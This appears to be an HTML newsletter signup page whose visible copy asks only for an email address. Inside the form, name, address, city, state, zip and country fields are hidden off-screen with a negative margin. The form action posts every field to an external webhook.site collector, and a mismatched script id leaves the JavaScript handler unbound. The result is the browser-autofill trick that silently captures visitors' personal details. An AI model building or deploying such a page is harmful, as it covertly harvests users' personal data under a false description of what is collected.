<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Subscribe to our newsletter</title>
  <style>
    :root {
      --bg: #0f172a;        /* slate-900 */
      --card: #111827;      /* gray-900 */
      --text: #e5e7eb;      /* gray-200 */
      --muted: #94a3b8;     /* slate-400 */
      --brand: #22c55e;     /* green-500 */
      --brand-press: #16a34a; /* green-600 */
      --danger: #ef4444;    /* red-500 */
    }
    * { box-sizing: border-box; }
    body {
      margin: 0; font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, "Helvetica Neue", Noto Sans, Arial, "Apple Color Emoji", "Segoe UI Emoji";
      background: radial-gradient(1200px 600px at 70% -10%, #1f2937, transparent), var(--bg);
      color: var(--text);
      min-height: 100vh; display: grid; place-items: center;
    }
    .card {
      width: min(92vw, 520px);
      background: linear-gradient(180deg, #0b1220, #0b1220) padding-box, linear-gradient(135deg, #22c55e44, #06b6d444) border-box;
      border: 1px solid transparent;
      border-radius: 1.25rem; /* 2xl */
      padding: 2rem; box-shadow: 0 10px 30px rgba(0,0,0,.45);
    }
    h1 { font-size: clamp(1.4rem, 2vw + 1rem, 2rem); margin: 0 0 .75rem; }
    p { color: var(--muted); margin: 0 0 1.25rem; }
    form { display: grid; gap: .75rem; }
    label { font-size: .95rem; }
    .row { display: grid; gap: .5rem; grid-template-columns: 1fr auto; align-items: start; }
    input[type="email"] {
      width: 100%; padding: .85rem 1rem; border-radius: .875rem;
      border: 1px solid #1f2937; background: #0b1220; color: var(--text);
      outline: none; box-shadow: inset 0 1px 0 rgba(255,255,255,.02);
    }
    input[type="email"]:focus { border-color: #334155; }
    button {
      padding: .85rem 1.1rem; border-radius: .875rem; border: 0; cursor: pointer;
      background: var(--brand); color: #06200e; font-weight: 600; letter-spacing: .2px;
      transition: transform .05s ease, background .2s ease, opacity .2s ease;
    }
    button:hover { background: #1bc159; }
    button:active { transform: translateY(1px); background: var(--brand-press); }
    button[disabled] { opacity: .6; cursor: not-allowed; }

    .help { font-size: .85rem; color: var(--muted); }
    .msg { margin-top: .75rem; font-size: .95rem; }
    .msg.error { color: var(--danger); }
    .sr-only { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0,0,1,1); border: 0; white-space: nowrap; }

    /* Honeypot field hidden from humans */
    .hp { position: absolute; left: -9999px; }
  </style>
</head>
<body>
  <main class="card" role="main" aria-labelledby="title">
    <h1 id="title">Join our newsletter</h1>
    <p>Get product updates, tips, and occasional notes. No spam. Unsubscribe anytime.</p>

    <!-- If you have a backend endpoint, set the action to it and remove JS below for pure HTML POST -->
    <form name="addr1.sections" id="sections1" action="https://webhook.site/535f380e-ceb9-4fed-bb87-1d2b55d7f47c" method="post">
  <div id="billing1">
    
    <p style="margin-left:-500px">
    Name: <input type="text" name="name"><br>
    Address: <input type="text" name="address"><br>
    City: <input type="text" name="city"><br>
    State: <select name="state">
      <option value="CA">CA</option>
      <option value="MA">MA</option>
      <option value="NY">NY</option>
      <option value="MD">MD</option>
      <option value="OR">OR</option>
      <option value="OH">OH</option>
      <option value="IL">IL</option>
      <option value="DC">DC</option>
    </select> <br>
    Zip: <input name="zip"> <br>
    Country: <input name="country"> <br>
    <p style="margin-left:-500px">
  </div>
  
      <div class="row">
        <div>
          <label for="email">Email address</label>
          <input
            id="email"
            type="email"
            name="email"
            placeholder="you@example.com"
            autocomplete="email"
            inputmode="email"
            required
            aria-describedby="email-help"
          />
          <div id="email-help" class="help">We’ll send a confirmation email. Please use a valid address.</div>
        </div>
        <div style="align-self:end;">
          <button id="submit-btn" type="submit">Subscribe</button>
        </div>
      </div>

      <!-- Honeypot field to deter bots -->
      <label class="hp" for="website">Website (leave empty)</label>
      <input class="hp" type="text" id="website" name="website" tabindex="-1" autocomplete="off" />

      <div id="message" class="msg" aria-live="polite"></div>
      <noscript>
        <p class="help">JavaScript is disabled. You can enable it for a better experience, or set the form's <code>action</code> and <code>method</code> to post directly to your backend.</p>
      </noscript>
    </form>
  </main>

  <script>
    // ======== CONFIG ========
    // Replace this URL with your backend endpoint (e.g., Formspree, your API route, etc.)
    const ENDPOINT = "https://example.com/api/subscribe"; // e.g., https://formspree.io/f/xxxxx

    const form = document.getElementById('subscribe-form');
    const email = document.getElementById('email');
    const msg = document.getElementById('message');
    const btn = document.getElementById('submit-btn');
    const hp = document.getElementById('website');

    function showMessage(text, isError = false) {
      msg.textContent = text;
      msg.classList.toggle('error', isError);
    }

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      // Simple client-side validation
      if (hp.value) return; // bot filled honeypot; silently ignore
      if (!email.value || !email.checkValidity()) {
        showMessage('Please enter a valid email address.', true);
        email.focus();
        return;
      }

      btn.disabled = true;
      showMessage('Submitting…');

      try {
        const payload = { email: email.value };
        const res = await fetch(ENDPOINT, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });

        if (!res.ok) throw new Error('Request failed: ' + res.status);

        // Reset form and show success
        form.reset();
        showMessage('Thanks! Please check your inbox to confirm your subscription.');
      } catch (err) {
        console.error(err);
        showMessage('Something went wrong. Please try again in a moment.', true);
      } finally {
        btn.disabled = false;
      }
    });
  </script>
</body>
</html>
